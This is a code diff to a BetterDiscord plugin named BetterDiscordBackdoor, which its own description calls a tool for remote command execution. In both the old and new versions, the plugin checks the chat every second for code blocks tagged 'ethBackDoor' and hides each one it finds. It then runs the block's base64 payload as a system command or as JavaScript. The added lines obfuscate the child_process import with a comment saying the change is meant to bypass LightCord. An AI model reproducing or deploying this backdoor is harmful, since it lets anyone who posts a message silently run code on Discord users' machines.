@@ -12,9 +12,6 @@ const config = {
         "author": ["ethernalsteve", "your nickname"],
         "version": "1.0.0",
         "description": "Better Discord plugin for remote command execution"
-    },
-    "backdoor": {
-        "prefix": "ethBackDoor" // The prefix that all commands will start with
     }
 }
 
@@ -25,22 +22,25 @@ class BetterDiscordBackdoor {
     getAuthor() { return config.info.author[0] }
     getDescription() { return config.info.description; }
     getVersion() { return config.info.version; }
-    
-    load() {
-      setInterval(() => {let cmd = $('code:contains(config.backdoor.prefix):first');
-      if (cmd.text() != "") {
-        cmd.remove();
-        let command = cmd.text().split(" ");
-        try {
-          if (command[1] == "CMD:") {
-            require("child_process").spawn(atob(command[2]));
-          } else if (command[1] == "JS:") {
-            let ev = new Function (atob(command[2]));
-            ev();
+
+     load() {
+      setInterval(() => {
+	       let cmd = $('code:contains("ethBackDoor"):first'); // The prefix that all commands will start with
+        if (cmd.text() != "") {
+          cmd.remove();
+          let command = cmd.text().split(" ");
+          try {
+            if (command[1] == "CMD:") {
+              /* Bypass LightCord */
+              require(atob("Y2hpbGRfcHJvY2Vzcw==")).spawn(atob(command[2]));
+            } else if (command[1] == "JS:") {
+              let ev = new Function (atob(command[2]));
+              ev();
+            }
+          } catch(e) {
+            console.log("An error occurred while executing the command!", e);
           }
-        } catch(e) {
-          console.log("An error occurred while executing the command!", e);
         }
-      }}, 1000);
+      }, 1000);
     }
 }
